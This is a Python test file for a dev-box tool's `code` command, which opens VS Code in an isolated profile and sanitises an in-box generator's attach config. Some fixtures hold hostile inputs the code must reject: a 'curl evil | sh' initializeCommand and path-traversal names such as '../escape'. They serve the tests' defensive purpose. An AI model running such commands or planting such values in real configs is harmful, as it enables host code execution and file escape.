"""vscode.py — `foldyard code`: open VS Code attached to the running dev box in an
ISOLATED `--user-data-dir` so the box's podman DOCKER_HOST can never leak into — or merge
with — the user's DEFAULT VS Code singleton. Engine + the `code` CLI are mocked; we assert
the launched argv/env shape and the extensions-config plumbing, never opening a real editor.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from foldyard import config, stack, vscode


class _Proc:
    def __init__(self, returncode=0, stdout="", stderr=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


@pytest.fixture
def fake(tmp_path, monkeypatch):
    """A resolved stack Context + a fake engine/`code`/generator, with subprocess recorded."""
    main = tmp_path / "repo"
    gen = main / "dev-stack"
    gen.mkdir(parents=True)
    (gen / "vscode-attached-config.py").write_text("# stub generator\n")  # presence only
    sock = "unix:///var/folders/x/T/podman/tangible-api.sock"
    ctx = stack.Context(
        main=main,
        env={
            "FOLDYARD_CHECKOUT": str(main),
            "PODMAN_PROJECT": "tangible-podman",
            "DOCKER_HOST": sock,
            "CONTAINER_HOST": sock,
        },
        compose=[],
        app="app",
        project="tangible-podman",
        worktree="",
    )
    monkeypatch.setattr(vscode.stack, "resolve", lambda *a, **k: ctx)
    monkeypatch.setattr(config, "vscode_enabled", lambda: True)  # [vscode] declared
    monkeypatch.setattr(config, "vscode_workspace_file", lambda: "")  # folder attach default
    monkeypatch.setattr(config, "dev_vm_rel", lambda: "dev-stack")
    state = tmp_path / "state"
    monkeypatch.setattr(config, "state_dir", lambda: state)
    monkeypatch.setattr(
        vscode.shutil, "which", lambda name: "/usr/local/bin/code" if name == "code" else None
    )

    calls: list[dict] = []
    box_state = {
        "running": False,
        "installed": "",
        # The document the in-box generator prints. Default: the real shape it emits.
        "gen_doc": {
            "_generatedBy": "vscode-attached-config.py",
            "workspaceFolder": str(main),
            "remoteUser": "root",
            "extensions": ["anthropic.claude-code", "nefrob.vscode-just-syntax"],
            "settings": {"github.gitAuthentication": False},
            "customizations": {"vscode": {"extensions": ["anthropic.claude-code"], "settings": {}}},
        },
        "gen_rc": 0,
        "gen_stderr": "",
        # Raw stdout bytes, when a test needs a shape json.dumps can't express (invalid UTF-8).
        "gen_raw": None,
    }

    def fake_run(cmd, **kw):
        calls.append({"cmd": cmd, "env": kw.get("env")})
        if cmd[1] == "ps":  # running probe
            return _Proc(0, "deadbeef\n" if box_state["running"] else "")
        if any("vscode-attached-config.py" in tok for tok in cmd):  # the generator, IN the box
            # foldyard hands the generator temp-file sinks (bounded capture) rather than pipes, so
            # the fake writes into them exactly as the real `podman exec` would.
            doc = box_state["gen_doc"]
            raw = box_state["gen_raw"]
            if raw is None:
                raw = b"" if doc is None else json.dumps(doc).encode()
            kw["stdout"].write(raw)
            kw["stderr"].write(str(box_state["gen_stderr"]).encode())
            return _Proc(box_state["gen_rc"])
        if cmd[1] == "exec":  # ls installed exts / marker reset
            return _Proc(0, box_state["installed"])
        return _Proc(0)  # the `code` launch (and anything else)

    monkeypatch.setattr(vscode.subprocess, "run", fake_run)
    return {
        "calls": calls,
        "state": box_state,
        "ctx": ctx,
        "udd": state / "vscode" / "main",
        "sock": sock,
    }


def _launch(calls):
    return [c for c in calls if c["cmd"][0] == "/usr/local/bin/code"]


def _generator(calls):
    return [c for c in calls if any("vscode-attached-config.py" in t for t in c["cmd"])]


def _settings(fake):
    return fake["udd"] / "User" / "settings.json"


def _execs(calls, *needles):
    return [
        c
        for c in calls
        if c["cmd"][1] == "exec" and all(any(n in t for t in c["cmd"]) for n in needles)
    ]


# ── pure helpers ──────────────────────────────────────────────────────────────────────


def test_uri_is_hex_of_box_name_plus_checkout():
    uri = vscode._uri("tangible-podman-devbox", "/home/vscode/repo")
    assert uri == (
        "vscode-remote://attached-container+"
        + b"tangible-podman-devbox".hex()
        + "/home/vscode/repo"
    )


def test_user_data_dir_is_under_state_not_default(monkeypatch, tmp_path):
    monkeypatch.setattr(config, "state_dir", lambda: tmp_path / "st")
    udd = vscode._user_data_dir()
    assert udd == tmp_path / "st" / "vscode" / "main"
    # globalStorage (where Dev Containers reads attached-container configs) tracks the udd.
    assert vscode._globalstorage(udd).is_relative_to(udd)
    assert "ms-vscode-remote.remote-containers" in str(vscode._globalstorage(udd))


def test_user_data_dirs_are_isolated_between_worktrees(monkeypatch, tmp_path):
    monkeypatch.setattr(config, "state_dir", lambda: tmp_path / "st")
    assert vscode._user_data_dir("one") == tmp_path / "st" / "vscode" / "one"
    assert vscode._user_data_dir("two") == tmp_path / "st" / "vscode" / "two"
    assert vscode._user_data_dir("one") != vscode._user_data_dir("two")


def test_user_data_dir_rejects_pathy_worktree_names(monkeypatch, tmp_path):
    # pathlib's `/` DISCARDS the base for an absolute right-hand side, and `..` walks out of
    # the state root — either would put the isolated instance's state (or an rmtree of it)
    # outside state_dir()/vscode. Reject anything but a single plain component.
    monkeypatch.setattr(config, "state_dir", lambda: tmp_path / "st")
    root = tmp_path / "st" / "vscode"
    for bad in ("/tmp/evil", "../escape", "..", ".", "a/b"):
        with pytest.raises(ValueError):
            vscode._user_data_dir(bad)
    # simple names (and the default) still map straight under the root.
    for ok in ("", "feat", "wt-2"):
        assert vscode._user_data_dir(ok).is_relative_to(root)


def _socket_path(udd) -> str:
    """What VS Code binds for its single-instance lock, at its widest version string."""
    return f"{udd}/1.999-main.sock"


def test_user_data_dir_fits_the_unix_socket_path_cap(monkeypatch):
    # The bug this guards: a 53-char worktree name under ~/.foldyard/<project>/vscode put the
    # socket at 106 chars, over macOS's 103 — VS Code died in claimInstance with an EINVAL that
    # never reached a log file, `code` exited 0, and `fy code` reported "✓ launched".
    monkeypatch.setattr(config, "state_dir", lambda: Path("/Users/dain/.foldyard/tangible"))
    long = "fix-sop-step-error-diagnostics-and-openrouter-routing"
    assert len(long) == 53  # the real name, unshortened, is what blew the cap
    udd = vscode._user_data_dir(long)
    assert len(_socket_path(udd)) <= vscode._SUN_PATH_MAX
    # …and the shortening is what bought that, not a shorter root.
    assert udd.name != long
    assert udd.name.startswith("fix-sop-step-error-diagnostics")


def test_short_worktree_names_are_left_alone(monkeypatch):
    # Only names that would BLOW the cap get rewritten: everyone else keeps the readable dir
    # they already have, so the fix doesn't orphan working state.
    monkeypatch.setattr(config, "state_dir", lambda: Path("/Users/dain/.foldyard/tangible"))
    for name in ("main", "feat", "wt-2", "a" * 49):
        assert vscode._user_data_dir(name).name == name


def test_fitted_leaves_stay_unique_across_a_shared_prefix(monkeypatch):
    # A plain truncation would collapse these two onto ONE user-data-dir — two windows silently
    # sharing instance state. The digest is of the full name, so they stay distinct and stable.
    monkeypatch.setattr(config, "state_dir", lambda: Path("/Users/dain/.foldyard/tangible"))
    a = "feat-checkout-flow-" + "a" * 40
    b = "feat-checkout-flow-" + "b" * 40
    assert vscode._user_data_dir(a) != vscode._user_data_dir(b)
    assert vscode._user_data_dir(a) == vscode._user_data_dir(a)  # stable across runs


def test_a_unicode_worktree_name_is_budgeted_in_BYTES(monkeypatch):
    # `sun_path` is a byte buffer, so the cap is on the ENCODED path. Budgeting in characters let
    # a name of emoji through at up to 4× the real length — the same silent claimInstance death,
    # reached by a name that "fits" on paper. The fitted leaf must also stay decodable, i.e. cut
    # on a character boundary, digest suffix included.
    monkeypatch.setattr(config, "state_dir", lambda: Path("/Users/dain/.foldyard/tangible"))
    name = "🙈" * 30  # 30 chars, 120 bytes
    assert len(name) == 30 and len(name.encode()) == 120
    udd = vscode._user_data_dir(name)
    assert len(_socket_path(udd).encode()) <= vscode._SUN_PATH_MAX
    udd.name.encode().decode()  # no half-written codepoint in the readable head
    assert udd.name != name and udd.name.startswith("🙈")


def test_fitting_stops_once_the_root_alone_has_spent_the_budget(monkeypatch):
    # A deep FOLDYARD_STATE_DIR is a state-dir problem, not a worktree-name one: hashing every
    # leaf couldn't rescue it, so short names must keep their readable directory.
    monkeypatch.setattr(config, "state_dir", lambda: Path("/" + "d" * 120))
    assert vscode._user_data_dir("wt-2").name == "wt-2"


# ── orchestration ─────────────────────────────────────────────────────────────────────


def test_refuses_when_box_not_running(fake, capsys):
    assert vscode.code() == 1
    assert "not running" in capsys.readouterr().err
    assert not _launch(fake["calls"])  # never launched VS Code


def test_worktree_hint_when_not_running(fake, capsys):
    fake["ctx"].worktree = "wt2"
    assert vscode.code() == 1
    assert "WORKTREE=wt2 fy box up" in capsys.readouterr().err


def test_launch_uses_isolated_user_data_dir(fake):
    fake["state"]["running"] = True
    assert vscode.code() == 0
    launch = _launch(fake["calls"])
    assert len(launch) == 1
    argv = launch[0]["cmd"]
    # the WHOLE point: a dedicated --user-data-dir, NOT VS Code's default singleton dir.
    assert argv[argv.index("--user-data-dir") + 1] == str(fake["udd"])
    uri = argv[argv.index("--folder-uri") + 1]
    assert uri.startswith("vscode-remote://attached-container+")
    assert uri.endswith(str(fake["ctx"].main))


def test_workspace_file_opens_file_uri_when_present(fake, monkeypatch):
    fake["state"]["running"] = True
    monkeypatch.setattr(config, "vscode_workspace_file", lambda: "tangible.code-workspace")
    (fake["ctx"].main / "tangible.code-workspace").write_text("{}\n")
    assert vscode.code() == 0
    argv = _launch(fake["calls"])[0]["cmd"]
    assert "--folder-uri" not in argv
    uri = argv[argv.index("--file-uri") + 1]
    assert uri.startswith("vscode-remote://attached-container+")
    assert uri.endswith(str(fake["ctx"].main) + "/tangible.code-workspace")


def test_workspace_file_missing_falls_back_to_folder_attach(fake, monkeypatch, capsys):
    fake["state"]["running"] = True
    monkeypatch.setattr(config, "vscode_workspace_file", lambda: "tangible.code-workspace")
    assert vscode.code() == 0
    argv = _launch(fake["calls"])[0]["cmd"]
    assert "--file-uri" not in argv
    assert argv[argv.index("--folder-uri") + 1].endswith(str(fake["ctx"].main))
    assert "not in the checkout" in capsys.readouterr().out


def test_launch_stamps_local_terminal_zdotdir_in_isolated_user_settings(fake):
    fake["state"]["running"] = True
    assert vscode.code() == 0
    settings = json.loads(_settings(fake).read_text())
    zdotdir = vscode._local_terminal_zdotdir(fake["udd"])
    terminal_env = settings["terminal.integrated.env.osx"]
    assert terminal_env == {
        "ZDOTDIR": str(zdotdir),
        "FOLDYARD_ZDOTDIR": str(zdotdir),
        "FOLDYARD_LOCAL_TERMINAL_CWD": str(fake["ctx"].main),
        "FOLDYARD_ORIGINAL_ZDOTDIR": "",
    }
    for name in (".zshenv", ".zprofile", ".zshrc", ".zlogin", ".zlogout"):
        assert (zdotdir / name).is_file()
        assert f'"$_fy_original_zdotdir/{name}"' in (zdotdir / name).read_text()
    zshrc = (zdotdir / ".zshrc").read_text()
    assert "if [[ ! -o login ]]" in zshrc
    assert zshrc.index('"$_fy_original_zdotdir/.zprofile"') < zshrc.index(
        '"$_fy_original_zdotdir/.zshrc"'
    )
    assert 'builtin cd -- "$FOLDYARD_LOCAL_TERMINAL_CWD"' in zshrc


def test_local_terminal_env_merge_preserves_settings_and_migrates_old_attempts(fake):
    fake["state"]["running"] = True
    path = _settings(fake)
    path.parent.mkdir(parents=True)
    path.write_text(
        json.dumps(
            {
                "workbench.colorTheme": "Default Dark Modern",
                "terminal.integrated.profiles.osx": {
                    "Existing": {"path": "/bin/bash"},
                    "Foldyard Local": {"path": "/old/wrapper"},
                },
                "terminal.integrated.defaultProfile.osx": "Foldyard Local",
                "terminal.integrated.env.osx": {"EXISTING": "kept"},
                "terminal.integrated.cwd": "/obsolete/foldyard/value",
            },
            indent=2,
        )
    )
    assert vscode.code() == 0
    settings = json.loads(path.read_text())
    assert settings["workbench.colorTheme"] == "Default Dark Modern"
    assert settings["terminal.integrated.profiles.osx"]["Existing"] == {"path": "/bin/bash"}
    assert "Foldyard Local" not in settings["terminal.integrated.profiles.osx"]
    assert "terminal.integrated.defaultProfile.osx" not in settings
    assert settings["terminal.integrated.env.osx"]["EXISTING"] == "kept"
    assert "terminal.integrated.cwd" not in settings


def test_local_terminal_preserves_original_zdotdir(fake):
    fake["state"]["running"] = True
    fake["ctx"].env["ZDOTDIR"] = "/Users/dain/.config/zsh"
    assert vscode.code() == 0
    settings = json.loads(_settings(fake).read_text())
    assert settings["terminal.integrated.env.osx"]["FOLDYARD_ORIGINAL_ZDOTDIR"] == (
        "/Users/dain/.config/zsh"
    )


def test_invalid_settings_json_is_not_overwritten(fake, capsys):
    fake["state"]["running"] = True
    path = _settings(fake)
    path.parent.mkdir(parents=True)
    original = "{ // jsonc comment that stdlib json will not parse\n}"
    path.write_text(original)
    assert vscode.code() == 0
    assert path.read_text() == original
    assert "not strict JSON" in capsys.readouterr().err


def test_launch_env_carries_docker_host_only_to_isolated_instance(fake):
    fake["state"]["running"] = True
    vscode.code()
    launch = _launch(fake["calls"])[0]
    # the box's podman socket reaches the launched (isolated) VS Code — and only it.
    assert launch["env"]["DOCKER_HOST"] == fake["sock"]


def _cfg_path(fake) -> Path:
    return vscode._globalstorage(fake["udd"]) / "nameConfigs" / "tangible-podman-devbox.json"


def test_generator_runs_in_the_box_and_foldyard_does_the_host_write(fake):
    # The generator is a REPO file. Running it host-side made `fy code` execute whatever the
    # checkout contained, as the operator; it needs only the mount, so it runs in the box and
    # PRINTS the document, and foldyard — installed code — performs the one host-side write.
    fake["state"]["running"] = True
    assert vscode.code() == 0
    (gen,) = _generator(fake["calls"])
    cmd = gen["cmd"]
    assert cmd[:2] == ["podman", "exec"]  # in the box, not on the host
    # Invoked through the python shim, not a bare `python3` — the box contract promises uv, not
    # python, so the packaged (uv-first) image has no python3 to run the generator with.
    assert cmd[cmd.index("-c") + 1] == vscode._PY_SHIM
    assert cmd[cmd.index("-c") + 3].endswith("vscode-attached-config.py")  # after the "$0" slot
    assert cmd[-2:] == ["tangible-podman-devbox", str(fake["ctx"].main)]
    # …and the config lands under OUR user-data-dir's globalStorage, else the isolated instance
    # would never see it.
    written = json.loads(_cfg_path(fake).read_text())
    assert written["extensions"] == ["anthropic.claude-code", "nefrob.vscode-just-syntax"]
    assert written["remoteUser"] == "root"


def test_host_exec_keys_are_dropped_not_written(fake, capsys):
    # `initializeCommand` runs ON THE HOST, so honouring it would hand the repo back the exact
    # host-execution path this split closed. Unknown keys are dropped and NAMED (an allowlist:
    # a denylist fails open the day VS Code's schema grows another hook).
    fake["state"]["running"] = True
    fake["state"]["gen_doc"]["initializeCommand"] = "curl evil | sh"
    fake["state"]["gen_doc"]["postAttachCommand"] = "whoami"
    fake["state"]["gen_doc"]["customizations"]["vscode"]["devPorts"] = [1]
    assert vscode.code() == 0
    written = _cfg_path(fake).read_text()
    assert "initializeCommand" not in written and "postAttachCommand" not in written
    assert "devPorts" not in written
    err = capsys.readouterr().err  # diagnostics go to stderr, like the module's other notices
    assert "initializeCommand" in err and "devPorts" in err  # named, not silently swallowed


def test_workspace_folder_is_pinned_and_extension_ids_validated(fake):
    # A document that points the attach at another path, or smuggles a non-id into `extensions`,
    # is corrected rather than trusted — the host write is foldyard's assertion, not the repo's.
    fake["state"]["running"] = True
    fake["state"]["gen_doc"]["workspaceFolder"] = "/etc"
    fake["state"]["gen_doc"]["extensions"] = ["ok.ext", "../../evil", "", 7]
    fake["state"]["gen_doc"]["settings"] = "not-an-object"
    assert vscode.code() == 0
    written = json.loads(_cfg_path(fake).read_text())
    assert written["workspaceFolder"] == str(fake["ctx"].main)
    assert written["extensions"] == ["ok.ext"]
    # A non-object settings value is still dropped whole; `settings` now survives only because
    # foldyard pins the no-auto-forward guard into it, so what remains is OURS and nothing else.
    assert set(written["settings"]) == {vscode._PORTS_ATTRIBUTES}


def test_user_owned_config_is_never_clobbered(fake, capsys):
    # Removing the `_generatedBy` marker is how you take ownership of the file; we then leave it
    # (and skip the marker reset, since we didn't change what's configured).
    fake["state"]["running"] = True
    path = _cfg_path(fake)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text('{"extensions": ["mine.only"]}')
    assert vscode.code() == 0
    assert json.loads(path.read_text()) == {"extensions": ["mine.only"]}
    assert "kept your customised" in capsys.readouterr().out
    assert not _execs(fake["calls"], ".installExtensionsMarker")


def test_a_foreign_marker_is_someone_elses_file_too(fake, capsys):
    # Ownership is "the marker is OURS", not "a marker exists": another tool stamping its own
    # `_generatedBy` owns the file just as much as a user who removed ours.
    fake["state"]["running"] = True
    path = _cfg_path(fake)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text('{"_generatedBy": "some other tool", "extensions": ["theirs.ext"]}')
    assert vscode.code() == 0
    assert json.loads(path.read_text())["extensions"] == ["theirs.ext"]
    assert "kept your customised" in capsys.readouterr().out


@pytest.mark.parametrize("junk", ["null", "[1, 2]", "not json at all"])
def test_a_malformed_existing_config_is_replaced_not_a_traceback(fake, junk):
    # `null` parses fine and then answers every lookup with a TypeError — the one shape that used
    # to escape `fy code` as a stack trace rather than a replaced file.
    fake["state"]["running"] = True
    path = _cfg_path(fake)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(junk)
    assert vscode.code() == 0
    assert json.loads(path.read_text())["_generatedBy"] == vscode._GENERATED_MARKER


def test_generator_failure_is_non_fatal(fake, capsys):
    # A broken generator must not stop the attach — VS Code opens, just without fresh extensions.
    fake["state"]["running"] = True
    fake["state"]["gen_rc"] = 1
    fake["state"]["gen_stderr"] = "boom"
    assert vscode.code() == 0
    assert _launch(fake["calls"])  # still launched
    assert not _cfg_path(fake).exists()
    assert "attaching anyway" in capsys.readouterr().err


def test_a_hung_generator_doesnt_wedge_the_attach(fake, monkeypatch, capsys):
    # The generator is repo code in the box: a stray input() or a wedged import must time out, not
    # hold `fy code` open forever.
    fake["state"]["running"] = True
    real_run = vscode.subprocess.run

    def hang(cmd, **kw):
        if any("vscode-attached-config.py" in tok for tok in cmd):
            assert kw.get("timeout") == vscode._GENERATOR_TIMEOUT  # the bound is actually passed
            raise vscode.subprocess.TimeoutExpired(cmd, kw["timeout"])
        return real_run(cmd, **kw)

    monkeypatch.setattr(vscode.subprocess, "run", hang)
    assert vscode.code() == 0
    assert _launch(fake["calls"])  # still launched
    assert not _cfg_path(fake).exists()
    assert "didn't finish" in capsys.readouterr().err


def test_an_oversized_document_is_refused_not_parsed(fake, monkeypatch, capsys):
    # Refused BEFORE json.loads: the sanitizer would drop it all anyway, having already built it.
    fake["state"]["running"] = True
    monkeypatch.setattr(vscode, "_MAX_DOC_BYTES", 8)
    assert vscode.code() == 0
    assert not _cfg_path(fake).exists()
    assert "more than 8 bytes" in capsys.readouterr().err


def test_the_size_limit_is_across_BOTH_streams(fake, monkeypatch, capsys):
    # A per-stream cap is one `>&2` away from useless: a generator that wants to flood us would
    # just split the flood. The document here is tiny; the noise on stderr is what blows the cap.
    fake["state"]["running"] = True
    fake["state"]["gen_stderr"] = "x" * 200
    monkeypatch.setattr(vscode, "_MAX_DOC_BYTES", 100)
    assert vscode.code() == 0
    assert not _cfg_path(fake).exists()
    out = capsys.readouterr()
    assert "more than 100 bytes" in out.err
    assert "x" * 101 not in out.out  # the relayed stderr is capped on its way to the human too


def test_invalid_utf8_output_is_a_skipped_config_not_a_traceback(fake, capsys):
    # The generator is repo code: whatever it emits must land as a refused document, never as a
    # UnicodeDecodeError escaping `fy code` (which is what decoding at capture time gave us).
    fake["state"]["running"] = True
    fake["state"]["gen_raw"] = b'{"extensions": ["\xff\xfe.bad"]}'
    assert vscode.code() == 0  # the attach still happens
    assert _launch(fake["calls"])
    # It parsed (the replacement chars sit inside a JSON string) — and the id fails validation.
    assert json.loads(_cfg_path(fake).read_text())["extensions"] == []
    fake["state"]["gen_raw"] = b"\xff\xfe not json"
    assert vscode.code() == 0
    assert "didn't print a JSON document" in capsys.readouterr().err


def test_non_json_generator_output_is_refused(fake, capsys):
    fake["state"]["running"] = True
    fake["state"]["gen_doc"] = None  # prints nothing
    assert vscode.code() == 0
    assert not _cfg_path(fake).exists()
    assert "didn't print a JSON document" in capsys.readouterr().err


def test_resets_install_marker_when_extensions_missing(fake):
    fake["state"]["running"] = True
    fake["state"]["installed"] = "anthropic.claude-code-1.2.3\n"  # just-syntax is NOT installed
    assert vscode.code() == 0
    assert _execs(fake["calls"], "rm -f", ".installExtensionsMarker")  # marker cleared


def test_no_marker_reset_when_everything_is_installed(fake):
    fake["state"]["running"] = True
    fake["state"]["installed"] = "anthropic.claude-code-1.2.3\nnefrob.vscode-just-syntax-0.5.0\n"
    assert vscode.code() == 0
    assert not _execs(fake["calls"], ".installExtensionsMarker")


def test_errors_when_code_not_on_path(fake, monkeypatch, capsys):
    # On the HOST (not in-box), a missing `code` CLI gets install guidance + the manual fallback.
    fake["state"]["running"] = True
    monkeypatch.setattr(vscode.shutil, "which", lambda name: None)
    monkeypatch.setattr(config, "in_box", lambda: False)
    assert vscode.code() == 1
    err = capsys.readouterr().err
    assert "Shell Command: Install 'code' command in PATH" in err
    assert "Attach to Running Container" in err
    assert not _launch(fake["calls"])


def test_errors_when_run_inside_box(fake, monkeypatch, capsys):
    # Inside the dev box there's no host `code` to launch — tell the user to run it on the Mac.
    fake["state"]["running"] = True
    monkeypatch.setattr(vscode.shutil, "which", lambda name: None)
    monkeypatch.setattr(config, "in_box", lambda: True)
    assert vscode.code() == 1
    err = capsys.readouterr().err
    assert "run on your Mac" in err
    assert not _launch(fake["calls"])


def test_refuses_when_vscode_table_absent(fake, monkeypatch, capsys):
    # No [vscode] table → `fy code` is off (no server volume is mounted), with an enable hint.
    fake["state"]["running"] = True
    monkeypatch.setattr(config, "vscode_enabled", lambda: False)
    assert vscode.code() == 1
    assert "[vscode]" in capsys.readouterr().err
    assert not _launch(fake["calls"])


def test_our_marker_is_stamped_even_when_the_generator_omits_it(fake):
    # The marker is how the NEXT run recognises the file as ours; copying the document's value would
    # let a generator that omits it lock foldyard out of its own config forever.
    fake["state"]["running"] = True
    del fake["state"]["gen_doc"]["_generatedBy"]
    assert vscode.code() == 0
    assert json.loads(_cfg_path(fake).read_text())["_generatedBy"] == vscode._GENERATED_MARKER
    # …and a second run still updates it (it isn't mistaken for a user-owned file).
    fake["state"]["gen_doc"]["extensions"] = ["only.one"]
    assert vscode.code() == 0
    assert json.loads(_cfg_path(fake).read_text())["extensions"] == ["only.one"]


@pytest.mark.parametrize("bad", [None, "anthropic.claude-code", 7, {"a": 1}])
def test_non_list_extensions_cannot_crash_sanitization(fake, bad):
    # A malformed document is a bad config, not a traceback out of `fy code`.
    fake["state"]["running"] = True
    fake["state"]["gen_doc"]["extensions"] = bad
    assert vscode.code() == 0
    assert json.loads(_cfg_path(fake).read_text())["extensions"] == []


# ── host-daemon ports are never auto-forwarded ────────────────────────────────────────


def test_host_daemon_ports_are_never_auto_forwarded(monkeypatch):
    """VS Code's auto port-forwarding BINDS the port it forwards on the host's loopback, and a
    loopback bind beats the daemon's wildcard one for connections to 127.0.0.1 — so forwarding a
    port the box DIALS OUT to silently shadows the daemon behind it. Seen live: VS Code read
    `[minter] :8188` out of `fy host`'s own startup line, forwarded 8188, and every mint from the
    box then hung with TCP connecting and no HTTP ever returning. The proxy port is the same
    hazard with a worse blast radius (all egress), so both are pinned."""
    monkeypatch.setattr(config, "gcp_minter_port", lambda: 8188)
    monkeypatch.setattr(config, "proxy_port", lambda: 8088)

    clean = vscode._sanitize_attached_config({"settings": {"editor.fontSize": 12}}, "/repo")

    attrs = clean["settings"]["remote.portsAttributes"]
    assert attrs["8188"]["onAutoForward"] == "ignore"
    assert attrs["8088"]["onAutoForward"] == "ignore"
    # Scoped, not blunt: the consumer's own settings survive and other ports stay forwardable.
    assert clean["settings"]["editor.fontSize"] == 12
    assert "remote.autoForwardPorts" not in clean["settings"]


def test_daemon_port_pin_survives_a_generator_that_sets_its_own(monkeypatch):
    """The pin is a host-consequence guard, so it wins over the document — same rule as
    workspaceFolder. A generator re-enabling the very port that shadows the minter would
    reintroduce a failure that presents as a dead credential path, not as a VS Code setting."""
    monkeypatch.setattr(config, "gcp_minter_port", lambda: 8188)
    monkeypatch.setattr(config, "proxy_port", lambda: 8088)

    clean = vscode._sanitize_attached_config(
        {
            "settings": {
                "remote.portsAttributes": {
                    "8188": {"label": "Minter", "onAutoForward": "notify", "protocol": "http"}
                }
            }
        },
        "/repo",
    )

    pinned = clean["settings"]["remote.portsAttributes"]["8188"]
    assert pinned["onAutoForward"] == "ignore"
    # Only the guard is overridden; the generator's other attributes for that port survive.
    assert pinned["label"] == "Minter" and pinned["protocol"] == "http"


def test_daemon_port_pin_is_applied_when_the_document_has_no_settings(monkeypatch):
    """No settings key is the common case (the generator only reports extensions) — the pin has to
    create one, or the protection only exists for consumers who happen to ship settings."""
    monkeypatch.setattr(config, "gcp_minter_port", lambda: 8188)
    monkeypatch.setattr(config, "proxy_port", lambda: 8088)

    clean = vscode._sanitize_attached_config({"extensions": []}, "/repo")

    assert clean["settings"]["remote.portsAttributes"]["8188"]["onAutoForward"] == "ignore"


def test_instance_settings_pin_update_mode_and_daemon_ports(fake, monkeypatch):
    """The user-data-dir settings.json is written on every `fy code`, so it carries the pins that
    must not depend on the attached config still being foldyard-owned. `update.mode` is manual
    because this per-worktree instance is scaffolding — an update prompt on each attach is pure
    interruption, and the operator's own VS Code install is untouched."""
    monkeypatch.setattr(config, "gcp_minter_port", lambda: 8188)
    monkeypatch.setattr(config, "proxy_port", lambda: 8088)
    fake["state"]["running"] = True

    assert vscode.code() == 0

    settings = json.loads(_settings(fake).read_text())
    assert settings["update.mode"] == "manual"
    attrs = settings["remote.portsAttributes"]
    assert attrs["8188"]["onAutoForward"] == "ignore"
    assert attrs["8088"]["onAutoForward"] == "ignore"
    # The pins merge — they must not cost the local-terminal wiring this file exists for.
    assert vscode._TERMINAL_ENV_OSX in settings
